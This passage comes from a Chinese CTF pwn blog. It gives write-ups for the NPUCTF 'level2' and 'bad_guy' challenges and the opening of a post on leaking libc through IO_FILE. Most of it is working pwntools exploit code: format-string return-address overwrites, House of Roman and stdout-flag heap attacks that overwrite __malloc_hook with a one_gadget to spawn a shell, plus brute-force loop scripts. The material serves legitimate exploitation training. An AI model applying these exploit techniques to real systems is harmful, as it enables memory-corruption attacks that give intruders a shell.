<p>整个程序只有一个可以循环利用的格式化字符串漏洞，一般来说，如果我们输入的格式化字符串在栈上，那么我们可以通过向格式化字符串所在位置这样一个偏移处写入任意值，从而实现任意地址写。但是这道题buf不在栈上，而是在bss段上（有时在堆上也是基本一样的利用），实现任意写需要依赖一个链表结构。</p>
<h4 id="栈数据"><a href="#栈数据" class="headerlink" title="栈数据"></a>栈数据</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb-peda$ stack 31</span><br><span class="line">0000| 0x7fffffffde78 --&gt; 0x555555554824 (&lt;main+138&gt;:	jmp    0x5555555547da &lt;main+64&gt;)</span><br><span class="line">0008| 0x7fffffffde80 --&gt; 0x555555554830 (&lt;__libc_csu_init&gt;:	push   r15)</span><br><span class="line">0016| 0x7fffffffde88 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">0024| 0x7fffffffde90 --&gt; 0x1 </span><br><span class="line">0032| 0x7fffffffde98 --&gt; 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br><span class="line">0040| 0x7fffffffdea0 --&gt; 0x1f7ffcca0 </span><br><span class="line">0048| 0x7fffffffdea8 --&gt; 0x55555555479a (&lt;main&gt;:	push   rbp)</span><br><span class="line">0056| 0x7fffffffdeb0 --&gt; 0x0 </span><br><span class="line">0064| 0x7fffffffdeb8 --&gt; 0x87b68dfcf204a6c4 </span><br><span class="line">0072| 0x7fffffffdec0 --&gt; 0x555555554690 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0080| 0x7fffffffdec8 --&gt; 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">0088| 0x7fffffffded0 --&gt; 0x0 </span><br><span class="line">0096| 0x7fffffffded8 --&gt; 0x0 </span><br><span class="line">0104| 0x7fffffffdee0 --&gt; 0xd2e3d8a9df44a6c4 </span><br><span class="line">0112| 0x7fffffffdee8 --&gt; 0xd2e3c813cdb4a6c4 </span><br><span class="line">0120| 0x7fffffffdef0 --&gt; 0x0 </span><br><span class="line">0128| 0x7fffffffdef8 --&gt; 0x0 </span><br><span class="line">0136| 0x7fffffffdf00 --&gt; 0x0 </span><br><span class="line">0144| 0x7fffffffdf08 --&gt; 0x7fffffffdf78 --&gt; 0x7fffffffe2f6 (&quot;XDG_VTNR&#x3D;7&quot;)</span><br><span class="line">0152| 0x7fffffffdf10 --&gt; 0x7ffff7ffe168 --&gt; 0x555555554000 --&gt; 0x10102464c457f </span><br><span class="line">0160| 0x7fffffffdf18 --&gt; 0x7ffff7de77db (&lt;_dl_init+139&gt;:	jmp    0x7ffff7de77b0 &lt;_dl_init+96&gt;)</span><br><span class="line">0168| 0x7fffffffdf20 --&gt; 0x0 </span><br><span class="line">0176| 0x7fffffffdf28 --&gt; 0x0 </span><br><span class="line">0184| 0x7fffffffdf30 --&gt; 0x555555554690 (&lt;_start&gt;:	xor    ebp,ebp)</span><br><span class="line">0192| 0x7fffffffdf38 --&gt; 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">--More--(25&#x2F;31)</span><br><span class="line">0200| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0208| 0x7fffffffdf48 --&gt; 0x5555555546ba (&lt;_start+42&gt;:	hlt)</span><br><span class="line">0216| 0x7fffffffdf50 --&gt; 0x7fffffffdf58 --&gt; 0x1c </span><br><span class="line">0224| 0x7fffffffdf58 --&gt; 0x1c </span><br><span class="line">0232| 0x7fffffffdf60 --&gt; 0x1 </span><br><span class="line">0240| 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>我们可以来看一下栈上面的数据，发现偏移为1的地方是libc，我们可以通过格式化字符串来泄露，得到one_gadget的实际地址，我们还需要知道ret_addr，我们需要将ret_addr写到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0032| 0x7fffffffde98 --&gt; 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>这个地方，这里是一个二级指针，指向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0240| 0x7fffffffdf68 --&gt; 0x7fffffffe2d3 (&quot;&#x2F;home&#x2F;pwn&#x2F;pwn&#x2F;npuctf&#x2F;level2&#x2F;level2&quot;)</span><br></pre></td></tr></table></figure>

<p>这个地方，我们在第一个地方写入ret_addr地址，然后在第二地方写入one_gadget地址，这样在程序执行完返回的时候，就可以getshell了。我们需要知道ret_addr，虽然栈的地址是随机的，但是我们知道栈上面的数据之间的偏移是不变的，这里我选取的是<code>0x7fffffffdf68</code>这个地址，栈底指针和栈顶指针相同，那么主函数的返回地址就是rbp的下一个地址，这里就是<code>0x7fffffffde80</code>，所以<code>0x7fffffffdf68-0x7fffffffde80=0xe8</code>，只要我们泄露出<code>0x7fffffffdf68</code>这个地址，我们就可以知道ret_addr的地址了。</p>
<h4 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27316)</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;level2&#39;)</span><br><span class="line">#elf&#x3D;ELF(&#39;.&#x2F;level2&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc6_2.23-0ubuntu10_amd64.so&#39;)</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def Write2Byte(data,offset):</span><br><span class="line">    global ret_addr</span><br><span class="line">    _offset &#x3D; (ret_addr + offset) % 0x10000</span><br><span class="line">    if(data &#x3D;&#x3D; 0):</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(_offset) + &quot;d%9$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">      payload&#x3D;&quot;%35$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">    else:</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(_offset) + &quot;d%9$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">      payload&#x3D;&quot;%.&quot; + str(data) + &quot;d%35$hn&quot;</span><br><span class="line">      payload&#x3D;payload.ljust(0x64,&#39;\x00&#39;)</span><br><span class="line">      sh.send(payload)</span><br><span class="line">      sh.recv()</span><br><span class="line">def Write8Byte(data,offset):</span><br><span class="line">  _offset &#x3D; offset</span><br><span class="line">  Write2Byte(int(data[10:14],16),_offset)</span><br><span class="line">  Write2Byte(int(data[6:10],16),_offset+2)</span><br><span class="line">  Write2Byte(int(data[2:6],16),_offset+4)</span><br><span class="line">  Write2Byte(0,_offset+6)</span><br><span class="line">  return _offset + 8</span><br><span class="line"></span><br><span class="line">payload1&#x3D;&#39;%7$p&#39;</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">libc_main_addr&#x3D;int(sh.recv(14),16)-240</span><br><span class="line">print (&#39;libc_main_addr:&#39; +hex(libc_main_addr))</span><br><span class="line"></span><br><span class="line">#libc&#x3D;LibcSearcher(&#39;__libc_start_main&#39;,libc_main_addr)</span><br><span class="line">#libc_base&#x3D;libc_main_addr-libc.dump(&#39;__libc_start_main&#39;)</span><br><span class="line">#0x45216</span><br><span class="line">#0x4526a</span><br><span class="line">#0xf02a4</span><br><span class="line">#0xf1147</span><br><span class="line">libc_base&#x3D;libc_main_addr-libc.sym[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line"></span><br><span class="line">payload2&#x3D;&#39;+%9$p&#39;</span><br><span class="line">sh.send(payload2)</span><br><span class="line">offest&#x3D;0xe0</span><br><span class="line">sh.recvuntil(&#39;+&#39;)</span><br><span class="line">data&#x3D;int(sh.recv(14),16)</span><br><span class="line">ret_addr&#x3D;data-offest</span><br><span class="line">print (&#39;ret_addr:&#39; +hex(ret_addr))</span><br><span class="line"></span><br><span class="line">offset&#x3D;0</span><br><span class="line">offset&#x3D;Write8Byte(str(hex(one_gadget)),offset)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">payload&#x3D;&#39;66666666\x00&#39;</span><br><span class="line">sh.send(payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="bad-guy"><a href="#bad-guy" class="headerlink" title="bad_guy"></a>bad_guy</h3><h4 id="checksec检查-2"><a href="#checksec检查-2" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="main函数如下：-2"><a href="#main函数如下：-2" class="headerlink" title="main函数如下："></a>main函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; &#x2F;&#x2F; eax@2</span><br><span class="line">  const char **v4; &#x2F;&#x2F; [sp+0h] [bp-20h]@1</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; argv;</span><br><span class="line">  prog_init(*(_QWORD *)&amp;argc, argv, envp);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;&#x3D;&#x3D;&#x3D; Bad Guy &#x3D;&#x3D;&#x3D;&quot;);</span><br><span class="line">      puts(&quot;1. Malloc&quot;);</span><br><span class="line">      puts(&quot;2. Edit&quot;);</span><br><span class="line">      puts(&quot;3. Free&quot;);</span><br><span class="line">      printf(&quot;&gt;&gt; &quot;, v4);</span><br><span class="line">      v3 &#x3D; read_num();</span><br><span class="line">      if ( v3 !&#x3D; 2 )</span><br><span class="line">        break;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 &#x3D;&#x3D; 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        delete();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v3 &#x3D;&#x3D; 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;2333, Bad Guy!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 !&#x3D; 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="add函数如下："><a href="#add函数如下：" class="headerlink" title="add函数如下："></a>add函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssize_t add()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax@1</span><br><span class="line">  size_t v1; &#x2F;&#x2F; rax@1</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+0h] [bp-10h]@1</span><br><span class="line">  void *size; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  printf(&quot;size: &quot;, v0);</span><br><span class="line">  LODWORD(v1) &#x3D; read_num();</span><br><span class="line">  size &#x3D; (void *)v1;</span><br><span class="line">  heaparray[2 * v3 + 1] &#x3D; malloc(v1);</span><br><span class="line">  if ( !heaparray[2 * v3 + 1] || v3 &gt; 0xA )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad Guy!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  heaparray[2 * v3] &#x3D; size;</span><br><span class="line">  printf(&quot;Content:&quot;);</span><br><span class="line">  return read(0, heaparray[2 * v3 + 1], (size_t)size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="edit函数如下：-1"><a href="#edit函数如下：-1" class="headerlink" title="edit函数如下："></a>edit函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int edit()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; &#x2F;&#x2F; rax@4</span><br><span class="line">  size_t v1; &#x2F;&#x2F; rax@4</span><br><span class="line">  int result; &#x2F;&#x2F; eax@6</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+0h] [bp-10h]@4</span><br><span class="line">  size_t nbytes; &#x2F;&#x2F; [sp+8h] [bp-8h]@4</span><br><span class="line"></span><br><span class="line">  if ( count &lt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad Guy!&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  --count;</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  printf(&quot;size: &quot;, v0);</span><br><span class="line">  LODWORD(v1) &#x3D; read_num();</span><br><span class="line">  nbytes &#x3D; v1;</span><br><span class="line">  if ( heaparray[2 * v3 + 1] &amp;&amp; v3 &lt;&#x3D; 9 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;content: &quot;);</span><br><span class="line">    result &#x3D; read(0, heaparray[2 * v3 + 1], nbytes);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    result &#x3D; puts(&quot;Bad Guy!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="delete函数如下：-1"><a href="#delete函数如下：-1" class="headerlink" title="delete函数如下："></a>delete函数如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int delete()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; &#x2F;&#x2F; rax@1</span><br><span class="line">  void **v1; &#x2F;&#x2F; rax@3</span><br><span class="line">  unsigned __int64 v3; &#x2F;&#x2F; [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  LODWORD(v0) &#x3D; read_num();</span><br><span class="line">  v3 &#x3D; v0;</span><br><span class="line">  if ( heaparray[2 * v0 + 1] || v0 &gt; 0xA )</span><br><span class="line">  &#123;</span><br><span class="line">    free(heaparray[2 * v0 + 1]);</span><br><span class="line">    v1 &#x3D; &amp;heaparray[2 * v3 + 1];</span><br><span class="line">    *v1 &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v1) &#x3D; puts(&quot;Bad Guy!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return (unsigned __int64)v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序没有类似show的函数，也没有uaf漏洞，但是有一个非常友好的堆溢出漏洞，可以造成任意字节长度的溢出，而且程序可以申请任意大小的chunk。这就满足了house of roman的利用条件，关于house of roman原理可以看我博客其他的文章。</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>创建4个chunk，大小分别是<code>chunk0:0x10</code>,<code>chun1:0x50</code>,<code>chunk2:0x60</code>,<code>chunk3:0x60</code>,free掉chunk2,修改chunk1的size位为0xd1，然后free掉chunk1，然后再申请0x50大小的chunk，此时被free掉的chunk2和chunk1的fd和bk指针都指向<code>main_arean</code>这个地址，这也是为什么要申请0xd1的原因，至于这里为什么会这样，是因为unsorted bin中的chunk被切割的缘故。</li>
<li>然后我们再修改chunk2 fd指针的低2个字节为<code>malloc_hook-0x23</code>连续malloc俩次拿到<code>malloc_hook-0x23</code>这个fake_chunk</li>
<li>再次修改chunk2的size为0xf1，fd指针的低2个字节为<code>malloc_hook-0x10</code>，malloc拿到这个chunk，此时，malloc_hook中为<code>main_arean</code>的地址，具体原因是因为unsorted bin attack ，可以看我其他博客。</li>
<li>通过我们之前申请的fake_chunk<code>malloc_hook-0x23</code>，将malloc_hook的地址修改为one_gadget地址。</li>
<li>最后我们随便malloc一个chunk来getshell。</li>
</ol>
<h4 id="exp如下：-2"><a href="#exp如下：-2" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,content) :</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base&#x3D;0xa0d000</span><br><span class="line"></span><br><span class="line">add(0,0x10,&#39;L0ne1y&#39;)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(3,0x60,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">off_by_one&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0xd1)</span><br><span class="line">edit(0,0x20,off_by_one)</span><br><span class="line">free(1)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">malloc_hook_here&#x3D;&#39;a&#39;*0x40+p64(0)*3+p64(0x71)+p64(libc_base+libc.sym[&#39;__malloc_hook&#39;]-0x23)[:2]</span><br><span class="line">edit(1,0x62,malloc_hook_here)</span><br><span class="line"></span><br><span class="line">#get malloc_hook-0x23</span><br><span class="line">add(2,0x60,p64(0))</span><br><span class="line">add(4,0x60,p64(0))</span><br><span class="line"></span><br><span class="line">edit(1,0x62+8,&#39;a&#39;*0x40+p64(0)*3+p64(0xf1)+p64(0)+p64(libc_base+libc.sym[&#39;__malloc_hook&#39;]-0x10)[:2])</span><br><span class="line"></span><br><span class="line">add(5,0xe0,&#39;L0ne1y&#39;) # unsorted bins</span><br><span class="line">#one_gadget &#x3D; [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line">one_gadget &#x3D; libc_base + 0xf1147</span><br><span class="line">edit(4,0x16,&#39;a&#39;*0x13+p64(one_gadget)[:3])</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(6))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(0x10))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 5000&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>

<p>通过爆破12bit的方式来进行getshell，爆破概率为1/4096，用这个脚本来打远程，难度太大了。我们结合io流的知识来进行泄露libc，来getshell。关于io流的知识可以看我其他博客。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>还是和刚才一样创建4个chunk，free掉chunk2，修改chunk1的size位为0x的d1，free掉chunk1，然后再申请chunk，使chunk2同时在fastbin和unsorted bin中。</li>
<li>然后通过chunk1修改chunk2的fd位低2个字节为<code>0x25dd</code>使地址变为<code>_IO_2_1_stderr_+157</code>，这里5dd是固定的，2是随机的，这个地址可以绕过size检查。</li>
<li>连续2次malloc拿到这个地址，然后修改stdout的flag位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</li>
<li>free掉chunk2，通过chunk1修改chunk2的fd位低2个字节为<code>malloc_hook-0x23</code></li>
<li>连续2次malloc拿到这个地址，将one_gadget写入<code>malloc_hook</code></li>
<li>随便malloc一次getshell。</li>
</ol>
<p>这种利用方法我们有1/16的机会可以getshell，比House of Roman的机会大很多。</p>
<h4 id="exp如下：-3"><a href="#exp如下：-3" class="headerlink" title="exp如下："></a>exp如下：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;bad_guy&#39;)</span><br><span class="line">libc&#x3D;elf.libc</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">def add(index,size,content) :</span><br><span class="line">	sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">	sh.sendline(&#39;1&#39;)</span><br><span class="line">	sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">	sh.send(content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;2&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.send(content)</span><br><span class="line"></span><br><span class="line">def free(index) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#libc_base&#x3D;0xa0d000</span><br><span class="line"></span><br><span class="line">add(0,0x10,&#39;L0ne1y&#39;)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(3,0x60,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">off_by_one&#x3D;&#39;a&#39;*0x10+p64(0)+p64(0xd1)</span><br><span class="line">edit(0,0x20,off_by_one)</span><br><span class="line">free(1)</span><br><span class="line">add(1,0x50,&#39;L0ne1y&#39;)</span><br><span class="line"></span><br><span class="line">edit(1,0x62,p64(0)*0xb+p64(0x71)+p16(0x25dd))</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(4,0x60,&#39;L0ne1y&#39;) #get fake_chunk</span><br><span class="line"></span><br><span class="line">edit(4,0x60,p64(0)*6+&#39;\x00&#39;*3+p64(0xfbad1800)+p64(0)*3+&#39;\x00&#39;) #get libc</span><br><span class="line">IO_stdder&#x3D;u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))-192</span><br><span class="line">print (&#39;IO_stdder:&#39; +hex(IO_stdder))</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;IO_stdder-libc.symbols[&#39;_IO_2_1_stderr_&#39;]</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line">one_gadget&#x3D;libc_base+0xf1147</span><br><span class="line">print(&#39;one_gadget:&#39; +hex(one_gadget))</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">edit(1,0x68,p64(0)*0xb+p64(0x71)+p64(libc_base+libc.symbols[&#39;__malloc_hook&#39;]-0x23))</span><br><span class="line">add(2,0x60,&#39;L0ne1y&#39;)</span><br><span class="line">add(5,0x60,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line">#edit(5,0x60,&#39;a&#39;*0x13+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;&gt;&gt; &#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(6))</span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">sh.sendline(str(32))</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="爆破脚本-1"><a href="#爆破脚本-1" class="headerlink" title="爆破脚本"></a>爆破脚本</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">for i in &#96;seq 1 20&#96;; do python exp.py; done;</span><br></pre></td></tr></table></figure>



<p>参考链接：<a href="https://www.cnblogs.com/Theffth-blog/p/12748295.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/Theffth-blog/p/12748295.html</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>CTF Game</category>
      </categories>
      <tags>
        <tag>NPUCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE泄露libc</title>
    <url>/2020/05/14/IO-FILE%E6%B3%84%E9%9C%B2libc/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2020/09/29/OlPgueqbNaCoMJh.png" alt="alt"></p>
<a id="more"></a>

<h3 id="FILE介绍（CTF-WIKI）"><a href="#FILE介绍（CTF-WIKI）" class="headerlink" title="FILE介绍（CTF WIKI）"></a>FILE介绍（CTF WIKI）</h3><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>
<h3 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h3><p>因为遇到了程序没有类似show这样的函数，单纯的使用House of Roman这样的方法来getshell难度太大，所以就学习了一下IO流的知识，通过IO流来泄露libc。</p>
<p>主要思路就是修改stdout的flag位为<code>0xfbad1800</code>,并且将<code>_IO_write_base</code>的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。</p>
<p>具体关于原理是怎么样的，我也不是太清楚，看了源码，只是了解了大概思路，太菜了我，啥都不会。</p>
<p>这里我使用一道例题来讲解一下如何利用io流来泄露libc。</p>
<h3 id="weapon-2019-de1ctf"><a href="#weapon-2019-de1ctf" class="headerlink" title="weapon_2019_de1ctf"></a>weapon_2019_de1ctf</h3><h4 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

